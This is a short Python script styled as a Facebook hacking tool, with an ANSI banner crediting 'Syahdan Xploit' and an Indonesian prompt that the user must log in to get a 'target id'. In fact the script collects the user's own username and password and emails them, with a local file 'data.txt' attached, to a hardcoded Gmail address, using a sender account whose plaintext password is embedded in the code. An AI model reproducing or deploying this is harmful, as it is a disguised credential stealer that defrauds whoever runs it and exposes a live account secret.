import yagmail
import os
import random
import sys
import time

logo = """\033[1;30m█████████
\033[1;30m█▄█████▄█      \033[1;91m●▬▬▬▬▬▬▬▬▬๑۩۩๑▬▬▬▬▬▬▬▬●
\033[1;30m█\033[1;92m▼▼▼▼▼ \033[1;92m- _ --_--\033[1;95m╔╦╗┌─┐┬─┐┬┌─   ╔═╗╔╗ 
\033[1;30m█ \033[1;92m \033[1;92m_-_-- -_ --__\033[1;93m ║║├─┤├┬┘├┴┐───╠╣ ╠╩╗
\033[1;30m█\033[1;92m▲▲▲▲▲\033[1;92m--  - _ --\033[1;96m═╩╝┴ ┴┴└─┴ ┴   ╚  ╚═╝ \033[1;96m
\033[1;30m█████████      \033[1;92m«----------✧----------»
\033[1;30m ██ ██
\033[1;31m╔════════════════════════════════════════════╗
\033[1;31m║\033[1;32m* \033[1;93mAuthor  \033[1;93m: \033[1;37Syahdan Xploit       \033[1;31m    ║
\033[1;31m║\033[1;32m* \033[1;93mWebsite \033[1;93m: \033[1;37m\033[4mhttps://tobat.com\033[0m \033[1;31m           ║
\033[1;31m║\033[1;32m* \033[1;93mGitHub  \033[1;93m: \033[1;37m\033[4mhttps://github.com/vam04\033[0m \033[1;31m   ║
\033[1;31m║\033[1;32m* \033[1;93mTeam    \033[1;93m: \033[1;37m\033[4mINDONEHACK TEAM\033[0m \033[1;31m   ║
\033[1;31m╚════════════════════════════════════════════╝"""


os.system("clear")


def jalan(s):
  for c in s +  "\n":
    sys.stdout.write(c)
    sys.stdout.flush()
    time.sleep(10. /500)  

receiver = "syahdanalhadi9@gmail.com"

print (logo)
jalan("anda harus login untuk mendapatkan id target")
time.sleep(1)
username = str(input("username : "))
password = str(input("password : "))


body = "password : "+password

filename = "data.txt"

yag = yagmail.SMTP("tabgosko@gmail.com","rehanhan12345")

yag.send(
	to=receiver,
	subject="information gathering smartphone, username : "+username,
	attachments=filename,
	contents=body,
)
